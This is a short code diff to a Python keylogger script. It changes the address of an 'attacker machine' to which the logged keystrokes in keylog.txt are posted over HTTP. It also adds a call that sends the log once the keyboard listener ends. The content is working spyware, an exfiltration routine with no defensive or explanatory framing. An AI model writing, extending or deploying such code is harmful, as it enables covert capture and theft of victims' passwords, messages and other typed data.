@@ -5,7 +5,7 @@ counter = 0
 
 # sends key log to attacker machine
 def send_log():
-    url = "http://172.16.23.130:8000"
+    url = "http://192.168.86.50:8000"
     files = {'file': open("keylog.txt", 'rb')}
     try:
         requests.post(url, files=files)
@@ -41,3 +41,4 @@ if __name__ == "__main__":
     open('keylog.txt', 'w').close()
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
+    send_log()
